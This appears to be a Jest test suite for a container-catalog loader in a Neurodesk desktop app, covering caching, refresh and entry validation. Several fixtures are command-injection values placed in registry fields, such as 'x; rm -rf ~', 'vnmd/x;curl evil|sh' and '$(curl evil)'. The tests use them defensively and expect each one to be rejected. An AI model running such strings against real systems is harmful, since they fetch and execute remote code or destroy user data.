import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  ContainerCatalog,
  createContainerCatalog,
  IContainerCatalogOptions
} from '../config/containerCatalog';

// Each test gets a fresh temp dir holding:
//   bundled/<id>.yml   the app's bundled fallback
//   cache/container-catalog.json
// and a fake fetch that returns whatever `remote` holds (or throws).

const HOUR = 60 * 60 * 1000;

const entry = (overrides: Record<string, unknown> = {}) => ({
  title: 'neurodesk',
  description: 'Neuroimaging tools.',
  registry: 'docker.io/vnmd/neurodesktop',
  defaultVersion: '2026-09-23',
  containerName: 'neurodeskapp',
  volumeMount: 'neurodesk-home',
  defaultStorageMount: 'neurodesktop-storage',
  ...overrides
});

// A domains.json body giving each domain the launch fields shown.
const doc = (containers: Record<string, unknown>) =>
  JSON.stringify({
    schemaVersion: 1,
    domains: Object.fromEntries(
      Object.entries(containers).map(([id, container]) => [
        id,
        {
          source_repositories: ['NeuroDesk/neurocontainers'],
          ...(container as object)
        }
      ])
    )
  });

const BUNDLED_YML = `title: neurodesk
defaultVersion: 2026-01-01
registry: docker.io/vnmd/neurodesktop
containerName: neurodeskapp
volumeMount: neurodesk-home
defaultStorageMount: neurodesktop-storage
description: |
  Bundled description.
`;

let dir: string;
let bundledDir: string;
let cacheFile: string;
let remote: string | Error;
let fetchCalls: number;
let clock: number;

function writeBundled(files: Record<string, string>) {
  for (const [name, text] of Object.entries(files)) {
    fs.writeFileSync(path.join(bundledDir, name), text);
  }
}

function writeCache(containers: Record<string, unknown>, fetchedAt: number) {
  fs.mkdirSync(path.dirname(cacheFile), { recursive: true });
  fs.writeFileSync(
    cacheFile,
    JSON.stringify({
      fetchedAt,
      schemaVersion: 1,
      domains: Object.fromEntries(
        Object.entries(containers).map(([id, container]) => [id, container])
      )
    })
  );
}

function makeCatalog(options: Partial<IContainerCatalogOptions> = {}) {
  return new ContainerCatalog({
    url: 'https://catalog.test/domains.json',
    bundledDir,
    cacheFile,
    appVersion: '2.1.0',
    now: () => clock,
    fetchText: async () => {
      fetchCalls++;
      if (remote instanceof Error) throw remote;
      return remote;
    },
    ...options
  });
}

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'catalog-test-'));
  bundledDir = path.join(dir, 'bundled');
  cacheFile = path.join(dir, 'cache', 'container-catalog.json');
  fs.mkdirSync(bundledDir);
  writeBundled({ 'neurodesk.yml': BUNDLED_YML });
  remote = new Error('offline');
  fetchCalls = 0;
  clock = 1_000_000_000;
});

afterEach(() => {
  fs.rmSync(dir, { recursive: true, force: true });
});

describe('startup snapshot (no network)', () => {
  it('uses bundled files when there is no cache', () => {
    const catalog = makeCatalog();
    expect(catalog.getSource()).toBe('bundled');
    expect(catalog.getEntry('neurodesk')).toMatchObject({
      defaultVersion: '2026-01-01',
      description: 'Bundled description.'
    });
    expect(fetchCalls).toBe(0);
  });

  it('turns an unquoted YAML date into a tag string', () => {
    expect(makeCatalog().getEntry('neurodesk').defaultVersion).toBe(
      '2026-01-01'
    );
  });

  it('names bundled entries by file name, and skips non-yaml files', () => {
    writeBundled({
      'lite.yaml': BUNDLED_YML.replace(
        'title: neurodesk',
        'title: lite'
      ).replace('containerName: neurodeskapp', 'containerName: liteapp'),
      'README.md': '# not a config',
      'domains.schema.json': '{}'
    });
    expect(makeCatalog().getIds()).toEqual(['lite', 'neurodesk']);
  });

  it('skips an invalid or unparseable bundled file but keeps the others', () => {
    writeBundled({
      'bad.yml': BUNDLED_YML.replace(
        'registry: docker.io/vnmd/neurodesktop',
        'registry: "x; rm -rf ~"'
      ),
      'broken.yml': 'title: [unclosed'
    });
    expect(makeCatalog().getIds()).toEqual(['neurodesk']);
  });

  it('survives a missing bundled directory', () => {
    const catalog = makeCatalog({ bundledDir: path.join(dir, 'nope') });
    expect(catalog.getEntries()).toEqual([]);
  });

  it('prefers a cache of any age over bundled files', () => {
    writeCache({ neurodesk: entry({ defaultVersion: 'cached' }) }, 0);
    const catalog = makeCatalog();
    expect(catalog.getSource()).toBe('cache');
    expect(catalog.getEntry('neurodesk').defaultVersion).toBe('cached');
  });

  it.each([
    ['not JSON', '{oops'],
    [
      'wrong schemaVersion',
      JSON.stringify({ fetchedAt: 1, schemaVersion: 9, domains: {} })
    ],
    ['missing fetchedAt', doc({ neurodesk: entry() })],
    [
      'no valid entries',
      JSON.stringify({
        fetchedAt: 1,
        schemaVersion: 1,
        domains: { x: { title: '<b>' } }
      })
    ]
  ])('falls back to bundled when the cache is %s', (_label, text) => {
    fs.mkdirSync(path.dirname(cacheFile), { recursive: true });
    fs.writeFileSync(cacheFile, text);
    expect(makeCatalog().getSource()).toBe('bundled');
  });

  it('re-validates cached entries: a tampered cache entry is dropped', () => {
    writeCache(
      {
        neurodesk: entry(),
        evil: entry({ registry: 'vnmd/x;curl evil|sh' })
      },
      clock
    );
    expect(makeCatalog().getIds()).toEqual(['neurodesk']);
  });

  it('drops cached entries this app version cannot launch (after a downgrade)', () => {
    writeCache(
      { neurodesk: entry(), next: entry({ minAppVersion: '3.0.0' }) },
      clock
    );
    expect(makeCatalog().getIds()).toEqual(['neurodesk']);
  });
});

describe('refresh', () => {
  it('replaces the snapshot with the remote catalog and caches it', async () => {
    remote = doc({
      neurodesk: entry({ defaultVersion: '2026-10-01' }),
      lite: entry({ title: 'lite', containerName: 'liteapp' })
    });
    const catalog = makeCatalog();
    await catalog.refresh();

    expect(catalog.getSource()).toBe('remote');
    expect(catalog.getIds()).toEqual(['lite', 'neurodesk']);
    expect(catalog.getEntry('neurodesk').defaultVersion).toBe('2026-10-01');

    const restarted = makeCatalog();
    expect(restarted.getSource()).toBe('cache');
    expect(restarted.getIds()).toEqual(['lite', 'neurodesk']);
  });

  it('does not fetch while the cache is younger than the TTL', async () => {
    writeCache({ neurodesk: entry() }, clock - HOUR / 2);
    await makeCatalog().refresh();
    expect(fetchCalls).toBe(0);
  });

  it('fetches once the cache is older than the TTL', async () => {
    writeCache({ neurodesk: entry() }, clock - 2 * HOUR);
    remote = doc({ neurodesk: entry({ defaultVersion: 'new' }) });
    const catalog = makeCatalog();
    await catalog.refresh();
    expect(fetchCalls).toBe(1);
    expect(catalog.getEntry('neurodesk').defaultVersion).toBe('new');
  });

  it('force ignores the TTL', async () => {
    writeCache({ neurodesk: entry() }, clock);
    remote = doc({ neurodesk: entry() });
    await makeCatalog().refresh({ force: true });
    expect(fetchCalls).toBe(1);
  });

  it('always fetches when running on bundled files', async () => {
    remote = doc({ neurodesk: entry() });
    await makeCatalog().refresh();
    expect(fetchCalls).toBe(1);
  });

  it('shares one fetch between concurrent calls', async () => {
    remote = doc({ neurodesk: entry() });
    const catalog = makeCatalog();
    await Promise.all([
      catalog.refresh(),
      catalog.refresh(),
      catalog.refresh()
    ]);
    expect(fetchCalls).toBe(1);
  });

  it('does nothing when no URL is configured', async () => {
    const catalog = makeCatalog({ url: '' });
    await catalog.refresh({ force: true });
    expect(fetchCalls).toBe(0);
    expect(catalog.getSource()).toBe('bundled');
  });

  describe('keeps the current snapshot when the whole document is unusable', () => {
    beforeEach(() => {
      writeCache({ neurodesk: entry({ defaultVersion: 'stale' }) }, 0);
    });

    it.each([
      ['the network fails', new Error('ENOTFOUND')],
      ['the body is not JSON', '<html>502</html>'],
      [
        'the schemaVersion is newer',
        JSON.stringify({
          schemaVersion: 2,
          domains: { neurodesk: entry() }
        })
      ],
      ['domains is missing', JSON.stringify({ schemaVersion: 1 })],
      ['domains is empty', doc({})],
      [
        'no domain has launch fields',
        JSON.stringify({
          schemaVersion: 1,
          domains: { neuroimaging: { source_repositories: ['A/b'] } }
        })
      ],
      [
        'it is the old containers.json shape',
        JSON.stringify({ schemaVersion: 1, containers: { neurodesk: entry() } })
      ],
      ['no entry is usable', doc({ newone: entry({ title: '<script>' }) })]
    ])('%s', async (_label, body) => {
      remote = body;
      const catalog = makeCatalog();
      await expect(catalog.refresh()).resolves.toBeUndefined();
      expect(catalog.getSource()).toBe('cache');
      expect(catalog.getEntry('neurodesk').defaultVersion).toBe('stale');
    });
  });

  describe('per-entry fallback', () => {
    it('keeps the last good entry when the remote one is invalid', async () => {
      writeCache({ neurodesk: entry({ defaultVersion: 'good' }) }, 0);
      remote = doc({
        neurodesk: entry({ registry: 'vnmd/$(curl evil)' }),
        lite: entry({ title: 'lite', containerName: 'liteapp' })
      });
      const catalog = makeCatalog();
      await catalog.refresh();
      expect(catalog.getEntry('neurodesk').registry).toBe(
        'docker.io/vnmd/neurodesktop'
      );
      expect(catalog.getEntry('neurodesk').defaultVersion).toBe('good');
      expect(catalog.getEntry('lite')).toBeDefined();
    });

    it('uses the bundled entry when there is no cached one', async () => {
      remote = doc({ neurodesk: entry({ containerName: 'bad name' }) });
      const catalog = makeCatalog();
      await catalog.refresh();
      expect(catalog.getEntry('neurodesk').defaultVersion).toBe('2026-01-01');
    });

    it('keeps the last good entry when the remote one needs a newer app', async () => {
      writeCache({ neurodesk: entry({ defaultVersion: 'good' }) }, 0);
      remote = doc({
        neurodesk: entry({ defaultVersion: 'needs-3', minAppVersion: '3.0.0' })
      });
      const catalog = makeCatalog();
      await catalog.refresh();
      expect(catalog.getEntry('neurodesk').defaultVersion).toBe('good');
    });

    it('drops a new invalid entry that has no fallback', async () => {
      remote = doc({
        neurodesk: entry(),
        newone: entry({ volumeMount: '/etc' })
      });
      const catalog = makeCatalog();
      await catalog.refresh();
      expect(catalog.getIds()).toEqual(['neurodesk']);
    });

    it('skips a new entry that needs a newer app', async () => {
      remote = doc({
        neurodesk: entry(),
        next: entry({ minAppVersion: '9.0.0' })
      });
      const catalog = makeCatalog();
      await catalog.refresh();
      expect(catalog.getIds()).toEqual(['neurodesk']);
    });

    it('caches the fallback, so it survives the next restart too', async () => {
      writeCache({ neurodesk: entry({ defaultVersion: 'good' }) }, 0);
      remote = doc({ neurodesk: entry({ registry: 'BAD' }) });
      await makeCatalog().refresh();
      expect(makeCatalog().getEntry('neurodesk').defaultVersion).toBe('good');
    });
  });

  describe('one containerName per domain', () => {
    it('keeps the first domain in ID order when two share a containerName', async () => {
      remote = doc({
        neuroimaging: entry(),
        microscopy: entry({ title: 'microscopy' })
      });
      const catalog = makeCatalog();
      await catalog.refresh();
      expect(catalog.getIds()).toEqual(['microscopy']);
    });

    it('keeps both when their containerNames differ', async () => {
      remote = doc({
        neuroimaging: entry(),
        microscopy: entry({ title: 'microscopy', containerName: 'microapp' })
      });
      const catalog = makeCatalog();
      await catalog.refresh();
      expect(catalog.getIds()).toEqual(['microscopy', 'neuroimaging']);
    });

    it('applies to the cache as well', () => {
      writeCache(
        { neuroimaging: entry(), microscopy: entry({ title: 'microscopy' }) },
        clock
      );
      expect(makeCatalog().getIds()).toEqual(['microscopy']);
    });
  });

  describe('domains.json shape', () => {
    it('skips a domain that has no container yet', async () => {
      remote = JSON.stringify({
        schemaVersion: 1,
        domains: {
          neurodesk: {
            source_repositories: ['NeuroDesk/neurocontainers'],
            ...entry()
          },
          microscopy: { source_repositories: ['Example/microcontainers'] }
        }
      });
      const catalog = makeCatalog();
      await catalog.refresh();
      expect(catalog.getIds()).toEqual(['neurodesk']);
    });

    it('falls back for a domain that is not an object', async () => {
      writeCache({ neurodesk: entry({ defaultVersion: 'good' }) }, 0);
      remote = JSON.stringify({
        schemaVersion: 1,
        domains: {
          neurodesk: 'oops',
          lite: {
            ...entry({ title: 'lite', containerName: 'liteapp' })
          }
        }
      });
      const catalog = makeCatalog();
      await catalog.refresh();
      expect(catalog.getEntry('neurodesk').defaultVersion).toBe('good');
    });

    it('does not copy pipeline fields such as source_repositories and eessi_stacks', async () => {
      remote = JSON.stringify({
        schemaVersion: 1,
        domains: {
          neurodesk: {
            source_repositories: ['NeuroDesk/neurocontainers'],
            eessi_stacks: ['2025.06'],
            eessiCatalogUrl:
              'https://apps-catalog.scigetorg.workers.dev/neuroimaging/eessi.json',
            ...entry()
          },
          preclinical: {
            source_repositories: ['NeuroDesk/neurocontainers'],
            eessi_stacks: ['2025.06'],
            eessiCatalogUrl:
              'https://apps-catalog.scigetorg.workers.dev/preclinical/eessi.json'
          }
        }
      });
      const catalog = makeCatalog();
      await catalog.refresh();
      expect(catalog.getIds()).toEqual(['neurodesk']);
      expect(catalog.getEntry('neurodesk')).not.toHaveProperty(
        'source_repositories'
      );
      expect(catalog.getEntry('neurodesk')).not.toHaveProperty('eessi_stacks');
      expect(catalog.getEntry('neurodesk').eessiCatalogUrl).toBe(
        'https://apps-catalog.scigetorg.workers.dev/neuroimaging/eessi.json'
      );
    });
  });

  it('removes containers the remote catalog no longer lists', async () => {
    writeBundled({
      'old.yml': BUNDLED_YML.replace('title: neurodesk', 'title: old').replace(
        'containerName: neurodeskapp',
        'containerName: oldapp'
      )
    });
    remote = doc({ neurodesk: entry() });
    const catalog = makeCatalog();
    expect(catalog.getIds()).toEqual(['neurodesk', 'old']);
    await catalog.refresh();
    expect(catalog.getIds()).toEqual(['neurodesk']);
  });

  it('strips unknown fields before caching', async () => {
    remote = doc({ neurodesk: { ...entry(), futureField: 'x' } });
    await makeCatalog().refresh();
    const cached = JSON.parse(fs.readFileSync(cacheFile, 'utf8'));
    expect(cached.domains.neurodesk).not.toHaveProperty('futureField');
  });

  it('still updates the snapshot when the cache cannot be written', async () => {
    const blocked = path.join(dir, 'file-not-dir');
    fs.writeFileSync(blocked, '');
    remote = doc({ neurodesk: entry({ defaultVersion: 'new' }) });
    const catalog = makeCatalog({
      cacheFile: path.join(blocked, 'container-catalog.json')
    });
    await catalog.refresh();
    expect(catalog.getEntry('neurodesk').defaultVersion).toBe('new');
  });

  it('leaves no temp file behind after writing the cache', async () => {
    remote = doc({ neurodesk: entry() });
    await makeCatalog().refresh();
    expect(fs.readdirSync(path.dirname(cacheFile))).toEqual([
      'container-catalog.json'
    ]);
  });
});

describe('createContainerCatalog', () => {
  const create = (env: NodeJS.ProcessEnv) =>
    createContainerCatalog({
      appVersion: '2.1.0',
      bundledDir,
      cacheDir: path.join(dir, 'cache'),
      env
    });

  it('reads a local catalog file from NEURODESK_CATALOG_URL', async () => {
    const file = path.join(dir, 'local.json');
    fs.writeFileSync(file, doc({ local: entry({ title: 'local' }) }));
    const catalog = create({ NEURODESK_CATALOG_URL: file });
    await catalog.refresh();
    expect(catalog.getIds()).toEqual(['local']);
  });

  it('validates the override like any remote catalog', async () => {
    const file = path.join(dir, 'local.json');
    fs.writeFileSync(file, doc({ local: entry({ registry: 'a;b' }) }));
    const catalog = create({ NEURODESK_CATALOG_URL: file });
    await catalog.refresh();
    expect(catalog.getIds()).toEqual(['neurodesk']);
    expect(catalog.getSource()).toBe('bundled');
  });

  it('never reads or writes the cache with an override', async () => {
    writeCache({ neurodesk: entry({ defaultVersion: 'cached' }) }, clock);
    const file = path.join(dir, 'local.json');
    fs.writeFileSync(file, doc({ local: entry({ title: 'local' }) }));
    const catalog = create({ NEURODESK_CATALOG_URL: file });
    expect(catalog.getSource()).toBe('bundled');
    await catalog.refresh();
    const cached = JSON.parse(fs.readFileSync(cacheFile, 'utf8'));
    expect(Object.keys(cached.domains)).toEqual(['neurodesk']);
  });

  it('without an override uses the cache file in cacheDir', () => {
    writeCache({ neurodesk: entry({ defaultVersion: 'cached' }) }, clock);
    const catalog = create({});
    expect(catalog.getSource()).toBe('cache');
  });
});
